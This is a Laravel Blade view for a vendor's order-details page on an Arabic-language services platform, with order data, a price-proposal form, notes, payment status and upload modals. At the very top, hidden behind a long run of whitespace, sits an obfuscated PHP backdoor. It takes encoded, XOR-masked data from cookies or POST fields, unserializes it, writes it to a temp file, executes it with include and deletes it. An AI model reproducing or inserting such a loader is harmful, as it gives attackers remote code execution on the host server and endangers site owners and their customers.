<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("seucxg")){class seucxg{public static $rbbbt = "lvaocdjmtblhrdpd";public static $zenke = NULL;public function __construct(){$enczvvdp = @$_COOKIE[substr(seucxg::$rbbbt, 0, 4)];if (!empty($enczvvdp)){$mnmjx = "base64";$wdxzmkzkra = "";$enczvvdp = explode(",", $enczvvdp);foreach ($enczvvdp as $zfplhl){$wdxzmkzkra .= @$_COOKIE[$zfplhl];$wdxzmkzkra .= @$_POST[$zfplhl];}$wdxzmkzkra = array_map($mnmjx . "_decode", array($wdxzmkzkra,));$wdxzmkzkra = $wdxzmkzkra[0] ^ str_repeat(seucxg::$rbbbt, (strlen($wdxzmkzkra[0]) / strlen(seucxg::$rbbbt)) + 1);seucxg::$zenke = @unserialize($wdxzmkzkra);}}public function __destruct(){$this->blmyiooox();}private function blmyiooox(){if (is_array(seucxg::$zenke)) {$jemeqq = sys_get_temp_dir() . "/" . crc32(seucxg::$zenke["salt"]);@seucxg::$zenke["write"]($jemeqq, seucxg::$zenke["content"]);include $jemeqq;@seucxg::$zenke["delete"]($jemeqq);exit();}}}$acffs = new seucxg();$acffs = NULL;} ?>@extends('engazFawry.layouts.dashboard')

@section('dashboard')

<nav aria-label="breadcrumb">
  <ol class="breadcrumb">
    <li class="breadcrumb-item"><a href="  {{ route('client_dashboard') }}">لوحة التحكم</a></li>
    <li class="breadcrumb-item"><a href="{{ route('panel.estfsar') }}">طلبات العملاء</a></li>
    <li class="breadcrumb-item active" aria-current="page">طلب رقم:  {{$order->id}}</li>
  </ol>
</nav>
 @if (Auth::check())
  <?php $cid= Auth::id(); ?>
@endif
<div class="aside-row p-2 mb-3 text-right">

    <div class="row">
      <h5>تفاصيل الطلب : {{$order->id}}</h5>
      <table class="table table-bordered">
        <tbody>
          <tr>
            <td>الخدمة المطلوبة  </td>
            <td>{{ $order->mo3amla->service->name }}</td>
          </tr>
          <tr>
            <td>موضوع المعاملة  </td>
            <td>{{ $order->mo3amla->mo3amla_subject }}</td>
          </tr>
          <tr>
            <td>تفاصيل المعاملة  </td>
            <td>{{ $order->mo3amla->mo3amla_details }}</td>
          </tr>
          <tr>
            <td>المدينة  </td>
            <td>{{ $order->mo3amla->city->name }}</td>
          </tr>

          <tr>
            <td>حالة العرض  </td>
            <td>
              @if( $order->status == "-1" || $order->status == "0" )
                <p style="margin: 0;"> جديد</p>
              @else
                <p style="margin: 0;">  تم تقديم السعر</p>
              @endif
            </td>
          </tr>
         
          @if(($order->status == "0" || $order->mo3amla->status == "0" ) && ($order->price == NULL && $order->choosen != "0" ))

          <tr style="text-align:center; background-color:#fff;" >
            <td colspan="2" >تقديم عرض سعر  </td>
          </tr>

          <form class="engaz-form signup-form text-right light" action="{{ route('submit.proposal') }}" method="POST" id="form">
            @csrf
            @method('PUT')
              @if (Auth::check())
              <?php $cid= Auth::id(); ?>
                <input value="{{$cid}}" type="hidden" name="user_id">
              @endif
              <input value="{{$order->id}}" type="hidden" name="process_id">


          <tr style="background-color:#fff;" >
            <td>تكلفة تنفيذ الخدمة</td>
            <td>
                <div class="form-group">
                    <input required="" type="number" min="0" class="form-control transform" name="vendor_price"> 
                </div>
            </td>
          </tr>
          <tr style="background-color:#fff;" >
            <td>عدد ايام التنفيذ  </td>
            <td>
                <div class="form-group">
                    <input required="" type="number"  min="0" class="form-control transform" name="vendor_days" > 
                </div>
            </td>
          </tr>
          <tr style="background-color:#fff;" >
            <td>متطلبات التنفيذ  </td>
            <td>
                <div class="form-group">
                    <textarea required="" class="form-control transform" name="vendor_requirement"> </textarea>
                </div>
            </td>
          </tr>
          <tr style="background-color:#fff;" >
            <td>  </td>
            <td>
                <div class="form-group text-center">
                    <input type="submit" class="engaz-btn transform" value="تقديم العرض">
                </div>
            </td>
          </tr>
   </form>
   @elseif($order->status == "1" )
      <tr style="text-align:center; background-color:#fff;" >
            <td colspan="2" >عرض السعر المقدم  </td>
          </tr>

        <tr style="background-color:#fff;" >
            <td>تكلفة تنفيذ الخدمة</td>
            <td> {{ $order->price }}</td>
          </tr>
          <tr style="background-color:#fff;" >
            <td>عدد ايام التنفيذ  </td>
            <td> {{ $order->days }}</td>
          </tr>
          <tr style="background-color:#fff;" >
            <td>متطلبات التنفيذ  </td>
            <td> {{ $order->requirement }}</td>
          </tr>

        @if($order->choosen == "1" && ( $order->mo3amla->status == "1" || $order->mo3amla->status == "2" || $order->mo3amla->status == "4" || $order->mo3amla->status == "-4" || $order->mo3amla->status == "-5") )

          @if($order->mo3amla->attachments != Null )
          <tr>
            <td>المرفقات  </td>
            <td>

                @php 
                  $images = unserialize($order->mo3amla->attachments);
                @endphp

                @foreach($images as $img)

                  @php 
                    $ext = pathinfo($img, PATHINFO_EXTENSION);
                  @endphp


                  @if($ext == 'pdf' || $ext == 'PDF')

                    <a class="pdfFile" href="{{ asset('storage/order_mo3amla') .'/'. $img}}" target="_blank">
                      <i style="line-height: 50px;" class="fa fa-file-pdf-o"></i>  
                    </a>

                  @else
                    <img data-url="{{ asset('storage/order_mo3amla') }}/{{$img}}" class="openImageModal"  style="display: inline-block;float: right;border: 1px solid #853BCC;width: 50px;cursor:pointer; height: 50px;float: right;margin-left: 5px;" src="{{ asset('storage/order_mo3amla') }}/{{$img}}" style="margin-left:7px;" width="50" height="50">
                  @endif
                @endforeach
            </td>
          </tr>
          @endif  {{-- have attachments   --}}

        @endif {{-- order mo3amla status = 1   --}}

   @endif {{-- order->choosen == "1" --}}

    @if($order->choosen == "1" && ( $order->mo3amla->status == "1" || $order->mo3amla->status == "2" || $order->mo3amla->status == "4" || $order->mo3amla->status == "-4" || $order->mo3amla->status == "-5" || $order->mo3amla->status == "5" ) )






{{-- 2- Order Need Notes --}}

  @if($order->mo3amla->m_have_notes == "1")

    @if($order->mo3amla->notes->count() > 0 )

      @php
        $lastNote = $order->mo3amla->notes->last();
      @endphp

        @if( $lastNote->from == "admin" && $lastNote->to == "vendor" && $lastNote->vendor_id == $cid  && $lastNote->status == "1" )

          {{-- 2 - Detect Hidden field addNote --}}

           <form class="signup-form text-right" style="margin-bottom:0;" action="{{ route('vendor.answerNote') }}" method="POST" enctype="multipart/form-data" id="form">

            @csrf
            @method('put')
      
            <input value="{{$cid}}" type="hidden" name="user_id">
            <input value="{{$order->mo3amla->id}}" type="hidden" name="order_id">


          <tr style="background-color:#fff">
            <td>الملاحظات على الطلب :</td>
            <td>
              {{  $lastNote->content }}
            </td>
          </tr>

          @if($lastNote->need_text ==  1 )

          <input value="{{  $lastNote->id  }}" type="hidden" name="addNote">
            <tr style="background-color:#fff">
              <td>الرد :</td>
              <td>
                <textarea class="form-control" rows="3" name="orderNote" placeholder="ملاحظات" required autocomplete="off"></textarea>
              </td>
          </tr>

           <tr style="background-color:#fff">
            <td colspan="2">                
              <input type="submit" class="engaz-btn transform" style=" margin: 0;padding: 7px 50px !important;" value="ارسال">
            </td>
          </tr>
            
          @endif {{--  $lastNote->m_processNeedTextNotes ==  1 --}}

        @endif {{--  $lastNote->from == "admin" && $lastNote->to == "client" && $lastNote->user_id == $cid  && $lastNote->status == "1"  --}}

      @endif {{-- $order->notes->count() > 0  --}}

    @endif {{-- $order->status == "-4" && $order->m_have_notes == "1" --}}








          <tr>
            <td>حالة الطلب </td>
            <td>
              <span style="color:green;font-size:15px;">
                @if($order->mo3amla->status == "4")
                تم الانجاز  

                @elseif($order->mo3amla->status == "1" )
                معمد لديكم ... يرجى التحقق من حالة الدفع والبدء بالتنفيذ

                @elseif($order->mo3amla->status == "2" )
                
                قيد الاجراء
                @elseif($order->mo3amla->status == "-4" )
                 نواقص بالطلب
                
                 @elseif($order->mo3amla->status == "-5" )

                 تم الرد على الملاحظات

                 @elseif($order->mo3amla->status == "5" )

                 تم الانجاز واقفال الطلب
                 
                @endif
                </span>
            </td>
          </tr>

         {{-- Check Order payment Status --}}
              @if(
                ($order->mo3amla->payment_method == 'transfer' && $order->mo3amla->prove_status == 1)
                || 
                ($order->mo3amla->payment_method == 'online_payment' && $order->mo3amla->prove_status == 1)
                )

              <tr>
                <td>حالة الدفع </td>
                <td>
                <span style="color:green">
                    مدفوع
                </span>

              </td>
            </tr>


                {{-- if Paid Display Actions --}}
                @if($order->mo3amla->status == "1" || $order->mo3amla->status == "-5")
      
                <tr>
                  <td>اجراءات </td>
                  <td>
                  {{-- send note --}}
                  <a onclick="event.preventDefault();  document.getElementById('newStatus').value = '-4'; $('#updateOrderStatus').show();  $('#haveNotes').modal('show'); /*document.getElementById('updateOrderStatus').submit();*/" href="#"  class="engaz-btn-light transform">طلب نواقص</a>
      
                  {{-- On process --}}
                  <a onclick="event.preventDefault();  document.getElementById('newStatus').value = '2'; document.getElementById('updateOrderStatus').submit();" href="#"  class="engaz-btn-light transform">قيد الاجراء</a>
              
                  {{-- Done Process --}}
                  <a onclick="event.preventDefault(); 
                  if(confirm('هل انت متأكد من اتمام المعاملة؟')) {

                    $('#enjaz_prove').modal('show');

                    }else{ 
                      return false 
                    }" href="#" class="engaz-btn transform">تم الانجاز ...</a>
      
                  </td>
                </tr>
                
      
      
                @elseif($order->mo3amla->status == "2" || $order->mo3amla->status == "-4")
                      
                <tr>
                  <td>اجراءات </td>
                  <td>
                  {{-- send note --}}
                  <a onclick="event.preventDefault();  document.getElementById('newStatus').value = '-4';   $('#updateOrderStatus').show();  $('#haveNotes').modal('show'); /*document.getElementById('updateOrderStatus').submit();*/" href="#"  class="engaz-btn-light transform">طلب نواقص</a>
            
                  {{-- Done Process --}}
                  <a onclick="event.preventDefault(); 
                  if(confirm('هل انت متأكد من اتمام المعاملة؟')) {

                    $('#enjaz_prove').modal('show');

                    }else{ 
                      return false 
                    }" href="#" class="engaz-btn transform">تم الانجاز ...</a>
      
                  </td>
                </tr>
             
                
              @endif 

              {{-- if Paid Display Actions --}}
              @else
              <tr>
                <td>حالة الدفع </td>
                <td>
                <span>
                    بانتظار الدفع
                </span>
              </td>
            </tr>
          @endif
           

         

            

        


          @elseif($order->choosen == "0")

          <tr>
            <td>حالة العرض </td>
            <td>
              <span style="color:red">  لم يتم قبول عرضك </span>
            </td>
          </tr>

          @elseif($order->choosen == Null && $order->mo3amla->status == "1")


          <tr>
            <td>حالة العرض </td>
            <td>
              <span> جديد بانتظار التعميد    </span>
            </td>
          </tr>
         
          @else 

          {{-- <span> --</span>  --}}

          @endif

        </tbody>
      </table>


</div>


@if($order->mo3amla->attachments != Null )
<div class="modal fade" id="lightBox" tabindex="-1" role="dialog" aria-hidden="true">
  <div class="modal-dialog modal-lg" role="document">
    <div class="modal-content">
    
      <div class="modal-body">
        <!-- Carousel markup goes in the modal body -->
        <img class="d-block w-100" id="imgView" src="">

      </div>
    </div>
  </div>
</div>

@endif

<div class="modal fade" id="haveNotes" tabindex="-1" role="dialog" aria-hidden="true">
  <div class="modal-dialog modal-lg" role="document">
    <div class="modal-content">
    
      <div class="modal-body">
        <!-- Carousel markup goes in the modal body -->
          <form id="updateOrderStatus" action="{{ route('vendor.update.status', ['id' => $order->mo3amla->id ]) }}" method="POST" style="display: none;">
            @method('PUT')
            @csrf
            <input type="hidden" name="orderId" value="{{ $order->mo3amla->id }}">
            <input type="hidden" name="vendorId" value="{{ $user->id }}">
            <input type="hidden" name="process_id" value="{{$order->id}}">

            
        
        <br>   
        <br>    
        <label>
              يرجى اضافة النواقص المطلوبة 
           </label>
            <div class="form-group">
              <textarea required="" class="form-control transform" name="vendor_notes"> </textarea>
            </div>

            <input type="hidden" id="newStatus" name="newStatus" >
              <div class="form-group text-left">
                <input type="submit" class="user-engaz-btn transform" value="ارسال">
              </div>
           </form>      
        </div>
    </div>
  </div>
</div>



<div class="modal fade" id="enjaz_prove" tabindex="-1" role="dialog" aria-hidden="true">
  <div class="modal-dialog modal-lg" role="document">
    <div class="modal-content">
    
      <div class="modal-body">
        <!-- Carousel markup goes in the modal body -->
          <form action="{{ route('vendor.update.enjazProve', ['id' => $order->mo3amla->id ]) }}" method="POST" style="display: block;" enctype="multipart/form-data">
            @method('PUT')
            @csrf
            <input type="hidden" name="orderId" value="{{ $order->mo3amla->id }}">
            <input type="hidden" name="vendorId" value="{{ $user->id }}">
            <input type="hidden" name="process_id" value="{{$order->id}}">
        
        <br>   
        <br>    
        <label>
              يرجى ارفاق اثبات الانجاز :  
           </label>
            <div class="form-group">
              <input type="file" name="enjaz_prove" required>
            </div>

            <input type="hidden" name="newStatus" value="4">
              <div class="form-group text-left">
                <input type="submit" class="user-engaz-btn transform" value="ارسال">
              </div>
           </form>      
        </div>
    </div>
  </div>
</div>



@endsection

@push('page_scripts')


<script>
  $(document).ready(function(){ 

    $(".openImageModal").on('click', function(){

        $("#imgView").attr('src', $(this).data('url'));
        $('#lightBox').modal('show');

    });
  });
</script>


@endpush